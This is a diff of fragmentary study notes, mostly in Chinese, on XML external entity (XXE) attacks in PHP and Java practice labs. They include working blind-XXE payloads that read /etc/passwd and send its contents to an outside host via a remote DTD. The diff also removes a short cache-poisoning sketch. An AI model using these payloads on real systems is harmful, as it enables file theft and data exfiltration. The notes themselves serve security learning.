@@ -1,6 +1,6 @@
 php
 dtd文档是什么?
-&lg  &ng  xss得防护得html实体,,是否与dtd文档有关??understand??????==  为啥要导入外部Html得dtd/html标准 ,标准模式和混杂模式
+  为啥要导入外部Html得dtd/html标准 
 
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
 
@@ -8,7 +8,7 @@ dtd文档是什么?
 <!ENTITY % eval "<!ENTITY &#37; exfil SYSTEM 'http://xxxxxxxxxxx:4399/?f=%file;'>">
 %eval;
 php 靶场vulhub
-#为啥是php伪协议,are you ok？我是不ok, simple——loadxxe，domxxe,  xmllib<1.6禁用外部实体..
+#为啥是php伪协议,, simple——loadxxe，domxxe,  xmllib<1.6禁用外部实体..
 为啥java一番风顺
 java docker webgoat
 <!ENTITY % file SYSTEM  "file:///etc/passwd">
@@ -16,24 +16,6 @@ java docker webgoat
 %eval;
 
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]><comment>  <text>&eval;</text></comment>
-
-假如 访问b网站 请求ip 1.1.1.1
-GET /1.TXT
-HOST B.COM
-
-B.COM   ----->查找B取出1.txt缓存到服务器上
-
-ip 1.1.1.1
-GET /2.JS
-HOST:A.COM
-A.COM  2.js取出来缓存在服务器上
-
-ip 1.1.1.1
-GET /2.JS
-HOST:B.COM
-
-取出来缓存在服务器上得2.js 污染成功
-
 
 
 
